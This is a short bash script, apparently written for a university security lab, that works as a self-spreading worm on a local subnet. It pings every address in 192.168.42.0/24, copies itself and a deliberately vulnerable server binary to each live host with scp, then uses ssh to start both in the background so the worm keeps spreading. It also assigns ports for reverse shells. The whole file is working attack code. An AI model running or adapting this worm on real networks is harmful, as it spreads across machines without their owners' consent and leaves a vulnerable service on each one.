#!/bin/bash

NETWORK_PREFIX="192.168.42"
VULSERVER_URL="https://raw.githubusercontent.com/SPRINGPEACHVINH/NT230.P21.ANTT/refs/heads/main/vulserver"
WORM_URL="https://raw.githubusercontent.com/SPRINGPEACHVINH/NT230.P21.ANTT/refs/heads/main/worm.sh"
PORT_BASE=4445
USER=$(whoami)
ME=$(hostname -I | awk '{print $1}')
COUNT=0

echo "[*] Starting worm from $ME"

for i in $(seq 1 254); do
    TARGET="$NETWORK_PREFIX.$i"

    if [ "$TARGET" == "$ME" ]; then
        continue
    fi

    echo "[*] Checking $TARGET..."
    ping -c 1 -W 1 $TARGET &> /dev/null
    if [ $? -eq 0 ]; then
        echo "[+] $TARGET is up!"

        # Copy vulserver và worm.sh sang máy
        scp /home/server/vulserver $USER@$TARGET:/tmp/vulserver
        scp /tmp/worm.sh $USER@$TARGET:/tmp/worm.sh

        # Tính port reverse shell cho máy này
        PORT=$((PORT_BASE + COUNT))
        echo "[*] Assigning reverse shell port: $PORT"

        # SSH vào và chạy vulserver + worm.sh + reverse shell
        ssh $USER@$TARGET "chmod +x /tmp/vulserver /tmp/worm.sh;
                           nohup /tmp/vulserver 5000 >/dev/null 2>&1 &
                           sleep 1;
                           nohup bash /tmp/worm.sh >/dev/null 2>&1 &" &

        COUNT=$((COUNT + 1))
    fi
done
